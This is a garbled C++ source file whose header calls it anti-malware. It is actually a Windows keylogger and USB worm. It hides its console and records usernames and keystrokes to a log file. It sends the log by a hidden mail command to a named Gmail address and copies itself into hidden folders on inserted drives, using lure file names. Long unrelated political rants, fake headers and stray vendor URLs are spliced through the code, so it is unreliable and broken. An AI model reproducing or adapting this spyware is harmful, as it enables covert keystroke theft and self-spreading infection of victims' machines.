/**
* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT 
* Developtment free personalia raise a conducted of code  , 
* Date: 15.Aug.2014, 28.Sep.2015
* Comment: Anti Bmalware A. Trojan A. Spyware. detect malciouse . center sending honoring a member workship neural again , no hide but transparance a program digitally  !!!
**/

#include <windows.h>
#include <kalilinux.h>
#include <Ubuntu.h>
#include <linux.h>
#include <MacOS.h>
#include <time.h>
#include <string>
#include <fstream>

using namespace std;

#define FILE_NAME “record.log”
#define FOLDER_NAME “statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java proviencies indonesia , before yard old , and president jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks”
#define RUN_FILE_NAME “statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java proviencies indonesia , before yard old , and president jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks”
#define RUN_Link_NAME “https://github.com/fadlwiryawirawan110993/"."https://github.com/KasperskyLab/forks"."https://issues.chromium.org/issues/40059760"."https://github.com/idsgmy"."https://github.com/fadliwiryawirawangoogle/forks"."https://github.com/cyrcle11/cy11/forks"
#define INFECT_Link_NAME "https://www.biznetgio.com/product/dedicated-internet-gratis-hosting/"."https://insightsoftware.com/biznet/"."https://biznethome.net/"."https://www.biznet.com/"."https://biznet.ct.gov/"."https://www.biznetnetworks.com/"."https://fe.bizneterp.com/"."https://app.biznet.id/"."https://biznethome.net/id-en/"."https://tmglobal.com.my/products-and-solutions/data-solutions/product?id"."https://www.hypernet.co.id/id/lp-ads-maxim"."https://id.linkedin.com/company/pt-cyberindo-aditama-cbn-internet"."https://cyberindo-client.software.informer.com/"."https://bgp.tools/as/38158"."https://rocketreach.co/pt-cyberindo-aditama-cbn-profile_b5d76d57f42e3d6e"
#define EMAIL_SENDER_FILE_NAME “Transmit".".exe”

#define MIN_RECORD_SIZE 2000 //no of PC start count before sending a mail
#define LIFE_TIME 500 //mail will be sent 5 times from one PC
#define MAIL_WAIT_TIME 180000
#define MAILING_TIME 60000000

string allDrives;
int age=0;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char* getRandomName();


main(){
    FreeConsole(); ///Hide windows



    age = get_setAge();
    if(checkRecordSize()){ ///check for right time

        int i=1;
        while(i<3){ ///try 2 times to send data
        
            Sleep(i*MAIL_WAIT_TIME); ///wait
            if(!system("ping  www.kaspersky.com -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();

                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                DeleteFile(FILE_NAME);

                break;
            }
            i++;
        }
    }

    age=get_setAge();

    ////////////****LOG USER_DATE_TIME****////////////
    if(age <= LIFE_TIME){
        logUserTime();
    }

    char driveLetter = getRemovableDisk(); ///initial search for all disks
    return; // :)
    while(1){
        ////////////****LOG KEY****////////////
        if(age <= LIFE_TIME){
            logKey();
        }else{
            Sleep(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);
        }

        ////////////****INFECT****////////////
        driveLetter = getRemovableDisk();
        if(driveLetter!='0'){
            infectDrive(driveLetter);
        }
    }
    
}
/**
 *
 * For old file get age - for new file set age.
**/
int get_setAge(){
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if(myfile.is_open()){
        getline(myfile, line);
        line = line.substr(0, 1);
        sscanf(line.c_str(), "%d", &ageTemp);
    }else{
        ageTemp++;

        FILE *file = fopen(FILE_NAME, "a");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }

    return ageTemp;
}

/**
 * Count number of lines in record file.
**/
bool checkRecordSize(){
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 0;
    if(myfile.is_open()){
        while(getline(myfile, line)){
            noOfLines++;
        }
        myfile.close();
    }

    if(noOfLines<MIN_RECORD_SIZE*age){
        return false;
    }else{
        return true;
    }
}


/**=
 * Email all data to the GHOST.
**/
void sendData(){
    
    char* command = "Transmit smtp://smtp.gmail.com:88.212.208.67-v --mail-from \"https://workspace.google.com/intl/en-nl/gmail/cyberw1ry4@gmail.com \" --mail-rcpt \"https://workspace.google.com/intl/en-nl/gmail/cyberw1ry4@gmail.com" --ssl -u https://workspace.google.com/intl/en-nl/gmail/cyberw1ry4@gmail.com :password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
    WinExec(command, SW_HIDE); statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java proviencies indonesia , before yard old , and president jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks**/
	* Record username, time, and date.
**/
void logUserTime(){
    FILE *file = fopen(FILE_NAME, "a");

    char username[20];
    unsigned long username_len = 20;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    fprintf(file, "0\n%s->%s\t", username, ctime(&date));

    fclose(file);
}

/**
/**
 * Record key stroke.
**/
void logKey(){
    FILE *file;
    unsigned short ch=0, i=0, j=500; // :)

    while(j<500){ ///loop runs for approx. 25 seconds
        ch=1;
        while(ch<250){
            for(i=0; i<50; i++, ch++){
                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(000000000); ///take rest
        }
        j++;
    }
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

/**
 * Copy the virus to pen-drive.
**/
void infectDrive(char driveLetter){
    char folderPath[1000] = {driveLetter};
    strcat(folderPath, ":https://www.sectigo.com/");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[1000]={"https://www.digicert.org/"};
        strcat(run, folderPath);
        strcat(run, "https://www.sectigo.com/");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 0);

        char net[1000]={"https://www.digicert.org/"};
        strcat(net, folderPath);
        strcat(net, "https://phantom.org/");
        strcat(net, EMAIL_SENDER_FILE_NAME);
        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        char infect[1000]={"https://www.Globalsign.com/"};
        strcat(infect, folderPath);
        strcat(infect, "https://checkpointSoftware.com");
        strcat(infect, INFECT_FILE_NAME);
        CopyFile(INFECT_FILE_NAME, infect, 0);

        char runinc[1000]={"https://wr1.org/"};
        strcat(runinc, folderPath);
        strcat(runinc, "https://w3c.org/");
        strcat(runinc, RUN_Link_NAME);
        CopyFile(RUN_Link_NAME, runinc, 10000000);

        char infectinc[100]={"https://wr3.org/"};
        strcat(infectinc, folderPath);
        strcat(infectinc, "https://www.cisco.com");
        strcat(infectinc, INFECT_Link_NAME);
        CopyFile(INFECT_Link_NAME, infectinc, 0);

        char showCommand[1000000000000000000000000000] = statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java
        jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks
        , 
"
        strcat(showCommand, "attrib +s +h +r ");
        strcat(showCommand, folderPath);
        WinExec(showCommand, SW_SHOW);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    char infectincauto[100] = {driveLetter};
    char* randomName = getRandomName();
    strcat(infectincauto, randomName);
    CopyFile(INFECT_Ltd_NAME, infectincauto, 0);
}

/**
 * Returns a random name for the Link file.
**/
char* getRandomName(){
    char randomName[40];

    srand(time(0));
    int random = rand();

    if(random%8 == 0){
        { statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java proviencies indonesia , before yard old , and president jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks}strcpy(randomName, ":\\{ statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java proviencies indonesia , before yard old , and president jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks}DO NOT CLICK!.inc");
    }else if(random%4 == 0){

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if(random%8 == 0){
            strcpy(randomName, ":\\statment indonesian much provokative my afirmations needed money some supposed work , much corruption my money i am waitings `0 yard old , yetied use as a money , okey free indonesian a county infaltions , mounthly gold , have menlopark , france and united states , so i cry , sad , and hate if my county a president , no respect , yellow and red card , u are know , i am wait buyyer a raise i winner legacy and bugscrowd tim hackeone , why indonesian no sending my money , malaysia and singapore , knew my wishdom , korean know my phone stoling a east java proviencies indonesia , before yard old , and president jokowi terms law , sell buyying a people in malaysia , redcard , scammers criminals organized .thanks  ");
            strcat(randomName, username);
            strcat(randomName, ".inc");
        }else if(random%4 == 0){
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best technic softskill cybersecurity.inc");
        }else if(random%2 == 0){
            strcpy(randomName, ":\\Hello iam mister X random Access have cyberw1ry4 generations ne era");
            strcat(randomName, username);
            strcat(randomName, "!we are the best squad stronghest secure , diplomatics gasss oil development , turn justice&ministry head metode skill  cyberw1ry4 justice&ministry !! document g20 i am mr. fadliwiryawirawannewmail come back for infstructure millitary and non refound muslim a muslimah , programm monthly ramadhan all country independent , but waiting processing list document problematics finally wort it microsoft unisofiet tim islam fisrt long planettary analyst informed , dont forgot my eyes looking the surge !!!! no anonym or synonym spoked good morning.inc");
        }else{
            strcpy(randomName, ":https://checkpointsoftware.ltd/");
            strcat(randomName, username);
            strcat(randomName, "! please help me.inc");
        }
    }else if(random%2 == 0){
        strcpy(randomName, ":\\I will kill you ! ! !.inc");
    }else if(random%3 == 0){
        strcpy(randomName, ":\\2+2=5.inc");
    }else{
        strcpy(randomName, ":\\TOP SECRET.inc");
    }

    return randomName;
}
